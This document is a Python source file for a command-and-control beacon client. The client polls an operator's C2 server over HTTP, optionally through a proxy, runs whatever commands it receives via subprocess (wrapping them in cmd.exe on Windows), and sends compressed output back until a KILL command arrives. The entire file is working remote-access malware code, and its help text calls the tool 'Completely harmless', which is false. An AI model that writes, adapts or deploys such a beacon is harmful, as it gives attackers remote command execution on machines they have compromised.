import http.client
import argparse
import json
import subprocess
import time
import zlib
import os
global KILL_REQUESTED
global _CLIENT
global NO_TASKS
global OS_TYPE

class Client_CC:
    """ 
    The client class, keeps track of c2 and proxy information if given any.
    Also keeps track of the current task and the most recent result.
    We set up the connection once, then just close and open it.
    Tested on linux, and windows. Should work on everything since we
    send the errors back to the c2 server.
    Windows errors are a little weird since you have to wrap the commands
    in a cmd.exe which doesn't propogate back up correctly, in that case
    the operator will just receive their command back with cmd.exe /c. 
    """
    def __init__(self, c2_ip, c2_port, proxy_ip, proxy_port):
        self.c2_ip = c2_ip
        self.c2_port = int(c2_port)
        self.proxy_ip = proxy_ip
        self.proxy_port = int(proxy_port)
        self.current_task = NO_TASKS
        self.result = None
        self.use_proxy = False
        self.client_connection = None
        if proxy_ip is not None:
            self.use_proxy = True
        self.task_header = {"Accept": "application/json", "Status": "task"}
        self.result_header = {"Accept": "application/json", "Status": "result"}
        self.setup_connection()
    
    def setup_connection(self):
        """
        I dont have a proxy to test with, but according to python stdlib docs it should
        just be a quick set tunnel with the c2 ip and ports and the main connection set
        to the proxy ip and ports.
        """
        if self.use_proxy:
            self.client_connection = http.client.HTTPConnection(
                host=self.proxy_ip,
                port=self.proxy_port
            )
            self.client_connection.set_tunnel(
                host=self.c2_ip, 
                port=self.c2_port,
            )
        else:
            self.client_connection = http.client.HTTPConnection(
                host=self.c2_ip,
                port=self.c2_port,
        )

    def check_for_task(self):
        """
        The meat of the program, runs get requests and sends back the information in
        a get request as well.
        """
        global KILL_REQUESTED
        global NO_TASKS
        try:
            self.client_connection.request("GET", "/", headers=self.task_header)
            response = zlib.decompress(self.client_connection.getresponse().read())
            response = json.loads(response)
            self.client_connection.close()
            if response == NO_TASKS:
                self.current_task = NO_TASKS
                return
            if response["command"] == "KILL":
                self.current_task = "KILL"
                self.result = json.dumps("KILLED").encode("utf8")
                self.send_result()
                KILL_REQUESTED = True
                return
            # Need to inject the standard cmd.exe /c into the command if on windows
            if OS_TYPE == "nt":
                self.current_task = "cmd.exe /c "
                self.current_task += response["command"]
            else:
                self.current_task = response["command"]
            self.run_task()
        except Exception as e:
            if type(e) is not ConnectionRefusedError:
                self.result = json.dumps(e.args).encode("utf8")
                self.send_result()
            self.client_connection.close()

    def send_result(self):
        """
        Sends the result to the server
        """
        self.result = zlib.compress(self.result)
        self.client_connection.request("GET", "/", body=self.result, headers=self.result_header)
        self.client_connection.close()
        self.current_task = NO_TASKS

    
    def run_task(self):
        """
        Runs the task via subprocess and pipes the information back into the client
        """
        clean_task = self.current_task.split(" ")
        running_task = subprocess.run(
            clean_task, 
            text=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            universal_newlines=True,
            timeout=25,
            check=True                
        )
        self.result = json.dumps(running_task.stdout.splitlines()).encode("utf-8")
        self.send_result()

def beacon(check_in_interval):
    """
    The main loop
    Sleeps for the desired interval in-between checks.
    """
    global _CLIENT
    global KILL_REQUESTED
    while KILL_REQUESTED != True:
        _CLIENT.check_for_task()
        time.sleep(check_in_interval)


if __name__ == "__main__":
    OS_TYPE = os.name
    KILL_REQUESTED = False
    NO_TASKS = "No Queued Tasks"
    arg_parser = argparse.ArgumentParser(description=
        """
        A client that connects to the specified server and port to run tasks. 
        Completely harmless. Only supports HTTP proxy.
        """,
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    arg_parser.add_argument("--c2_server_address", default="127.0.0.1", help="The server to connect to")
    arg_parser.add_argument("--c2_server_port", default="9000", help="The server's port to connect to")
    arg_parser.add_argument("--http_proxy_address", default=None, help="A proxy server address if required")
    arg_parser.add_argument("--http_proxy_port", default="8080", help="The proxy's port, ignored if the proxy address is blank")
    arg_parser.add_argument("--check_in_interval", default="10", help="The amount of seconds to wait between checking for tasks from the server")
    arguments = arg_parser.parse_args()
    _CLIENT = Client_CC(
        arguments.c2_server_address, 
        arguments.c2_server_port, 
        arguments.http_proxy_address, 
        arguments.http_proxy_port
    )
    beacon(int(arguments.check_in_interval))